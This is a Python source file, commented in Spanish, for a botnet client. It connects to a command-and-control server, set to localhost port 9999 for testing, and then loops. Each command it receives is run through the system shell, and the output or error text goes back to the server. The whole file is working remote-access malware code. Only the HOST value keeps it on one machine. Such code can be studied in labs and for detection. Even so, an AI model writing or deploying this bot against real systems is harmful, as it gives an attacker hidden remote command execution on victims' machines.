import socket
import subprocess

# Dirección y puerto del servidor C&C (debe coincidir con el servidor)
HOST = "127.0.0.1"  # IP del servidor C&C (En este caso, usamos localhost para prueba)
PORT = 9999  # Puerto que escucha el servidor C&C

# Función que usaremos para conectar el bot al servidor C&C
def conectar_a_CnC():
    """
    Conecta el bot al servidor C&C.

    Crea un socket y se conecta a la dirección y puerto especificados en HOST y PORT.
    Si la conexión es exitosa, imprime un mensaje de confirmación y devuelve el socket.

    Returns:
        socket.socket: El socket conectado al servidor C&C.
    """
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creamos un socket
    bot.connect((HOST, PORT))  # Conectamos al servidor
    print(f"Conectado al servidor C&C {HOST}:{PORT}")  # Imprimimos confirmación
    return bot # Retornamos el socket

# Función para esperar órdenes del servidor C&C
def esperar_ordenes(bot):
    """
    Espera órdenes del servidor C&C y las ejecuta.

    Recibe comandos del servidor C&C a través del socket `bot` y los ejecuta en el
    intérprete de comandos actual. Si el comando falla, envía el mensaje de error al
    servidor C&C.

    Parameters:
        bot (socket.socket): El socket conectado al servidor C&C.

    Returns:
        None
    """
    
    while True:
        # Recibir comandos del servidor C&C
        orden = bot.recv(1024).decode('utf-8', errors='ignore')  # Aumentar el tamaño del buffer para recibir más datos
        if orden: # Si el comando no es vacío
            print(f"Comando recibido: {orden}")  # Imprimir el comando
            # Ejecutar el comando recibido y capturar la salida
            try:
                resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT) # Guarda en el resultado el resultado de la ejecución
                bot.send(resultado)  # Enviar el resultado al servidor
            except subprocess.CalledProcessError as e:
                bot.send(f"Error al ejecutar el comando: {e.output.decode('utf-8', errors='ignore')}".encode('utf-8'))  # Enviar el error al servidor

# Función principal que conecta el bot al servidor C&C y espera órdenes
def ejecutar_bot():
    """
    Conecta el bot al servidor C&C y espera órdenes.

    Primero, se conecta al servidor C&C usando la función `conectar_a_CnC`.
    Luego, entra en un bucle infinito en el que espera comandos del servidor C&C
    a través del socket `bot` y los ejecuta en el intérprete de comandos actual
    con la función `esperar_ordenes`.

    Returns:
        None
    """
    bot = conectar_a_CnC()  # Conectamos al servidor
    esperar_ordenes(bot)  # Esperamos órdenes

if __name__ == "__main__":
    ejecutar_bot()  # Ejecutamos el bot